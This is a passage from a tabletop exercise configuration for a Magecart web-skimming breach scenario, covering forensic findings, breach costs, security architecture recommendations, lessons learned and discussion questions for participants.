        suggestedDuration: 40,
        facilitatorNotes: 'Focus on sustainable improvements that prevent future Magecart-style attacks. The business impact discussion should be realistic about e-commerce breach consequences.',
        injects: [
          {
            id: 'mc-inj-4-1',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 1,
            title: 'PFI Investigation Results',
            content: 'PCI FORENSIC INVESTIGATION - FINAL REPORT\nInvestigator: Coalfire Systems (PFI)\nEngagement: Card Data Compromise Investigation\n\nEXECUTIVE SUMMARY:\n\nThe investigation confirmed a web skimming attack affecting payment card data.\n\nKEY FINDINGS:\n\n1. Compromised Cards: 98,234 (confirmed)\n2. Compromise Period: 22 days\n3. Data Captured: PAN, expiry, CVV, name, billing address\n4. Attack Vector: Third-party JavaScript (LiveAssist Pro widget)\n\nROOT CAUSES IDENTIFIED:\n\n1. Third-Party Risk Management:\n   - No security assessment of LiveAssist Pro on record\n   - No contractual security requirements\n   - No SRI implementation for third-party scripts\n\n2. Client-Side Security:\n   - CSP in report-only mode for 8+ months\n   - No client-side security monitoring solution\n   - 23 third-party scripts with no inventory\n\n3. Detection Capabilities:\n   - CSP violations not monitored\n   - No JavaScript integrity checking\n   - WAF rules did not inspect response bodies\n\nPCI DSS COMPLIANCE IMPACT:\n   - Requirements 6.4, 11.5, 12.8 found non-compliant\n   - Remediation required before compliance recertification\n\nREMEDIATION REQUIREMENTS (90 days):\n   - Implement strict CSP in enforcement mode\n   - Deploy client-side security monitoring\n   - Complete third-party script inventory and assessment\n   - Implement SRI for all external scripts\n   - Conduct penetration test of web application',
            type: 'information',
            severity: 'medium',
            triggerTime: 0,
            source: 'PCI Forensic Investigator',
            facilitatorNotes: 'The PFI findings are damaging but expected. Non-compliance findings will require significant remediation investment. The 90-day timeline is aggressive.',
            expectedActions: ['Accept PFI findings', 'Develop remediation plan', 'Budget for security improvements', 'Schedule compliance reassessment'],
            attachments: [],
            relatedQuestionIds: ['mc-q-4-1']
          },
          {
            id: 'mc-inj-4-2',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 2,
            title: 'Financial Impact Assessment',
            content: 'BREACH COST ANALYSIS - 6 MONTH PROJECTION\nFrom: CFO Office\n\nDIRECT COSTS:\n\n1. PFI Investigation: $175,000\n2. Legal Fees (ongoing): $450,000\n3. Customer Notification: $225,000\n4. Identity Monitoring (98K customers x $120/yr): $11,760,000\n5. Credit Card Fraud Liability: $2,850,000 (preliminary)\n6. Card Brand Fines: $350,000 (Visa) + $275,000 (MC)\n7. ICO Fine (estimated): $2,000,000 - $8,000,000\n8. Security Remediation: $1,200,000\n9. Increased Merchant Fees (2 years): $500,000\n\nTOTAL DIRECT COSTS: $19.5M - $25.5M\n\nINDIRECT COSTS:\n\n1. Customer Churn: Est. 8% of affected customers won\'t return\n   - Lifetime value impact: $4,200,000\n2. Revenue Loss During Incident: $1,800,000\n3. Brand Damage: Difficult to quantify\n4. Executive Time: 2,000+ hours\n\nINSURANCE COVERAGE:\n- Cyber Policy Limit: $10,000,000\n- Retention/Deductible: $500,000\n- Coverage Disputes: PCI fines may not be covered\n- Expected Recovery: $6,000,000 - $8,000,000\n\nNET FINANCIAL IMPACT: $12M - $18M after insurance\n\nNote: Class action litigation not yet quantified.',
            type: 'information',
            severity: 'high',
            triggerTime: 12,
            source: 'CFO Office',
            facilitatorNotes: 'The costs are significant but realistic for a breach of this size. Identity monitoring for 98K customers is the largest single cost. The GDPR fine range reflects ICO precedent.',
            expectedActions: ['Review insurance coverage', 'Plan for litigation reserves', 'Justify security investment', 'Prepare board financial briefing'],
            attachments: [],
            relatedQuestionIds: ['mc-q-4-2']
          },
          {
            id: 'mc-inj-4-3',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 3,
            title: 'Security Architecture Recommendations',
            content: 'SECURITY ARCHITECTURE REVIEW\nFrom: CISO / Application Security\n\nPROPOSED PAYMENT SECURITY ARCHITECTURE:\n\n1. CLIENT-SIDE SECURITY:\n   - Deploy Jscrambler/PerimeterX for real-time JS monitoring\n   - Strict CSP with nonce-based script loading\n   - SRI hashes for all third-party scripts\n   - Regular JS inventory audits (quarterly)\n   - Cost: $250,000/year\n\n2. PAYMENT ISOLATION:\n   - Move payment form to isolated subdomain\n   - Load payment fields via iframe from payment processor\n   - Implement tokenization - never touch raw card data\n   - Consider PCI-compliant hosted payment page\n   - Cost: $400,000 implementation + ongoing\n\n3. THIRD-PARTY GOVERNANCE:\n   - Security assessment required for all new scripts\n   - Annual reassessment of existing vendors\n   - Contractual security requirements\n   - Script loading requires security approval\n   - Cost: $100,000/year (staff + tooling)\n\n4. DETECTION & MONITORING:\n   - 24/7 monitoring of CSP violations\n   - Automated alerts for script changes\n   - Regular external skimmer scanning\n   - Browser-based threat detection\n   - Cost: $150,000/year\n\nTOTAL ANNUAL INVESTMENT: $900,000 - $1,200,000\n\nROI CALCULATION:\n- This breach cost: $12-18M\n- Annual prevention investment: ~$1M\n- If prevention stops one breach every 12-18 years, it\'s ROI positive',
            type: 'information',
            severity: 'low',
            triggerTime: 25,
            source: 'CISO',
            facilitatorNotes: 'The recommendations are comprehensive and realistic. The ROI calculation is compelling. Discuss prioritization if full investment isn\'t available.',
            expectedActions: ['Prioritize security investments', 'Develop implementation roadmap', 'Present business case to board', 'Set metrics for success'],
            attachments: [],
            relatedQuestionIds: ['mc-q-4-3']
          },
          {
            id: 'mc-inj-4-4',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 4,
            title: 'Lessons Learned Summary',
            content: 'POST-INCIDENT REVIEW - KEY LESSONS\n\nWHAT WORKED WELL:\n\n1. Researcher Engagement:\n   - Security researcher report was handled professionally\n   - Quick validation and response once reported\n   - Good model for responsible disclosure program\n\n2. Incident Response:\n   - Cross-functional team assembled quickly\n   - Evidence preservation was adequate for PFI\n   - Regulatory notifications met deadlines\n\n3. Communication:\n   - Customer notification was timely and clear\n   - Media response managed story effectively\n   - Internal communication kept stakeholders informed\n\nWHAT NEEDS IMPROVEMENT:\n\n1. Prevention:\n   - CSP was in report-only mode for 8 months\n   - No client-side security monitoring\n   - Third-party script inventory didn\'t exist\n   - Marketing could add scripts without review\n\n2. Detection:\n   - 22-day dwell time is unacceptable\n   - CSP violations were ignored\n   - No automated skimmer detection\n\n3. Preparedness:\n   - No pre-arranged PFI relationship\n   - Insurance coverage gaps discovered during incident\n   - Third-party vendor contracts lacked security terms\n\nKEY TAKEAWAY:\n"We had CSP. We had violation logs. We had 22 days of warnings we ignored. The technology existed - the process failed."',
            type: 'information',
            severity: 'low',
            triggerTime: 35,
            source: 'Incident Review Board',
            facilitatorNotes: 'The key takeaway is powerful - the organization had detection capability but failed to use it. Lessons learned should drive process changes, not just technology purchases.',
            expectedActions: ['Document lessons learned', 'Assign action item owners', 'Schedule follow-up review', 'Update incident response procedures'],
            attachments: [],
            relatedQuestionIds: ['mc-q-4-4']
          }
        ],
        discussionQuestions: [
          {
            id: 'mc-q-4-1',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 1,
            question: 'The PFI found three areas of PCI non-compliance. How do you prioritize remediation, and what happens if you miss the 90-day deadline?',
            category: 'coordination',
            responseType: 'text',
            guidanceNotes: 'Discuss remediation prioritization, PCI recertification requirements, and the consequences of continued non-compliance.',
            expectedThemes: ['Remediation prioritization', 'Compliance timeline', 'Resource allocation', 'Non-compliance consequences']
          },
          {
            id: 'mc-q-4-2',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 2,
            question: 'The net financial impact is $12-18M after insurance. How do you make the business case for $1M annual security investment to prevent future incidents?',
            category: 'resource',
            responseType: 'text',
            guidanceNotes: 'Discuss ROI calculations, risk quantification, board communication, and using the incident as a catalyst for change.',
            expectedThemes: ['ROI calculation', 'Risk communication', 'Board presentation', 'Investment justification']
          },
          {
            id: 'mc-q-4-3',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 3,
            question: 'The CISO recommends moving to a hosted payment page so you never touch card data. What are the tradeoffs between security, user experience, and business control?',
            category: 'decision',
            responseType: 'text',
            guidanceNotes: 'Discuss tokenization benefits, customer experience concerns, vendor dependency, and PCI scope reduction.',
            expectedThemes: ['Tokenization benefits', 'UX considerations', 'Vendor dependency', 'PCI scope']
          },
          {
            id: 'mc-q-4-4',
            createdAt: '2025-01-15T00:00:00Z',
            updatedAt: '2025-01-15T00:00:00Z',
            order: 4,
            question: 'The key finding was that CSP violations were logged for 22 days but ignored. What organizational changes ensure security alerts are actually investigated?',
            category: 'lessons_learned',
            responseType: 'text',
            guidanceNotes: 'Discuss alert fatigue, monitoring responsibilities, escalation procedures, and security operations maturity.',
            expectedThemes: ['Alert management', 'Monitoring ownership', 'Escalation procedures', 'Security operations']
          }
        ]
      }
    ],
    tags: ['magecart', 'web-skimming', 'javascript', 'e-commerce', 'pci-dss', 'credit-card', 'supply-chain', 'third-party-risk', 'csp', 'gdpr', 'breach-notification']
  }
}
